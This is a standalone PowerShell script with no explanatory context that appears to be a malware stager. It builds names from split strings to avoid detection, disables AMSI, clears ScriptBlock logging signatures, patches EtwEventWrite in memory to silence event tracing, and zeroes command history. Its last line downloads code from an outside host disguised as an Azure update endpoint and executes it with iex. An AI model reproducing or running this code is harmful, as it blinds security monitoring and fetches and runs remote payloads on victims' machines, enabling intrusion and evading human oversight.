# Minimal fingerprints, no "sensitive" strings in one piece
function d64($s) { 
    [Text.Encoding]::ASCII.GetString([Convert]::FromBase64String($s)) 
}

# Dynamically build type names
$asm = [Ref].Assembly
$g1 = $asm.GetType( ([string]::Join('',('S','y','s','t','e','m','.M','a','n','a','g','e','m','e','n','t','.A','u','t','o','m','a','t','i','o','n','.A','m','s','i','U','t','i','l','s'))) )
$g2 = $asm.GetType( ([string]::Join('',('S','y','s','t','e','m','.M','a','n','a','g','e','m','e','n','t','.A','u','t','o','m','a','t','i','o','n','.S','c','r','i','p','t','B','l','o','c','k'))) )

# AMSI bypass (amsiInitFailed = true)
$f1 = $g1.GetField(('a'+'m'+'s'+'i'+'I'+'n'+'i'+'t'+'F'+'a'+'i'+'l'+'e'+'d'), 'NonPublic,Static')
$f1.SetValue($null, $true)

# ScriptBlock signatures cleared
$f2 = $g2.GetField(('s'+'i'+'g'+'n'+'a'+'t'+'u'+'r'+'e'+'s'), 'NonPublic,Static')
$f2.SetValue($null, (New-Object 'System.Collections.Generic.HashSet[string]'))

# Patch EtwEventWrite in memory
if (-not ("NtdllPatch" -as [type])) {
    Add-Type @"
    using System;
    using System.Runtime.InteropServices;

    public class NtdllPatch {
        [DllImport("kernel32.dll")]
        public static extern IntPtr LoadLibrary(string lpFileName);
        [DllImport("kernel32.dll")]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
        [DllImport("kernel32.dll")]
        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
    }
"@
}

# EtwEventWrite patch (RET)
$patch = [Byte[]](0xC3)
$n = [NtdllPatch]::LoadLibrary(('n'+'t'+'d'+'l'+'l'+'.'+'d'+'l'+'l'))
$p = [NtdllPatch]::GetProcAddress($n, ([string]::Join('',"E","t","w","E","v","e","n","t","W","r","i","t","e")))
$o = 0
$s = [UIntPtr]::op_Explicit(1)
[NtdllPatch]::VirtualProtect($p, $s, 0x40, [ref]$o) | Out-Null
[Runtime.InteropServices.Marshal]::Copy($patch, 0, $p, 1)

# Clear history (optional)
Remove-Variable -Name MaximumHistoryCount -ErrorAction SilentlyContinue
Set-Variable -Name MaximumHistoryCount -Value 0 -Scope Global
(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://azure-update.germanywestcentral.cloudapp.azure.com:80/download/powershell/')-UseBasicParsing|iex
